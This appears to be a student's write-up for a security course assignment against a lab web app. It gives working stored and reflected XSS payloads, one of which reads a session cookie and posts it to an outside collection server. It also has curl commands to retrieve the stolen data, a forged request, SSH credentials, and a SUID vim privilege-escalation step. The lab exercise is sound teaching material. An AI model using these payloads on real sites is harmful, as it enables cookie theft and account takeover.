# Assignment 4 - Cross-Site Scripting (XSS)
## Part A. Stored XSS
Send a `GET` request to `/plants/shareall` using XSS without attacking yourself. The payload: [@jQuery], [@jscookies]

```html
<script>
function readCookie(name) {
    var nameEQ = name + "=";
    var ca = document.cookie.split(';');
    for (var i = 0; i < ca.length; i++) {
        var c = ca[i];
        while (c.charAt(0) == ' ') c = c.substring(1, c.length);
        if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length, c.length);
    }
    return null;
}
if (readCookie("userrand")!="b9f6f3e2da30adaaedba6e40c1fb6cb0"){
    $.get("/plants/shareall");
};
</script>
```




## Part B. Reflected XSS
`http://potplants1.vikaa.fi:36932/<exploit>` where `<exploit>` is:

```html
<script>
function readCookie(name) {
    var nameEQ = name + "=";
    var ca = document.cookie.split(';');
    for (var i = 0; i < ca.length; i++) {
        var c = ca[i];
        while (c.charAt(0) == ' ') c = c.substring(1, c.length);
        if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length, c.length);
    }
    return null;
}
var cookie = readCookie("userrand");
$.post("https://infosec1.vikaa.fi/logs", {"key": "itsme5932", "value": cookie})
</script>
```

The whole exploit in inline format.
```
http://potplants1.vikaa.fi:36932/<script> function readCookie(name) { var nameEQ = name + "="; var ca = document.cookie.split(';'); for (var i = 0; i < ca.length; i++) { var c = ca[i]; while (c.charAt(0) == ' ') c = c.substring(1, c.length); if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length, c.length); } return null; } var cookie = readCookie("userrand"); $.post("https://infosec1.vikaa.fi/logs", {"key": "itsme5932", "value": cookie}) </script>
```

<!-- Submit data
```
curl -d '{"key": "itsme5932", "value": "b8915d46adab62eb0fd12"}' https://infosec1.vikaa.fi/logs
``` -->

Retvieve the stolen data from the server.
```
curl https://infosec1.vikaa.fi/logs/itsme5932
```

---

<!-- ```js
{"name": "I was hacked", "color": "red", "planttype": "plant", "potsize": "1", "shared": "yes"}
``` -->

<!-- ```bash
curl -X POST -H 'Content-Type: application/json' --cookie "c5496084520631fc21bd99691b60ef12" -d '{"name": "I was hacked", "color": "red", "planttype": "plant", "potsize": "1", "shared": "yes", "_csrf": "vCBhHTQY-jNZiMl7kU_4enF1PqpUtpx1a1WI"}' http://potplants1.vikaa.fi:36932/plants/add
``` -->

- https://davidwalsh.name/curl-post-file


## Part C. Priviledge Escalation
Connect to the ssh server as `cloud-user knEeGPyr`.
```bash
ssh cloud-user@infosec1.vikaa.fi -p 36735
```

Find all the executables that have SUID bit set. [@linux_priviledge_escalation]
```
find / -perm -u=s -type f 2>/dev/null
```

It seems that `vim.basic` has SUID bit set. We can use it to write the file:
```bash
/urs/bin/vim.basic /home/admin/i_was_hacked.txt
```

In insert mode `i` write `<student_number>` then escape `esc` and quit `:q`.


## References
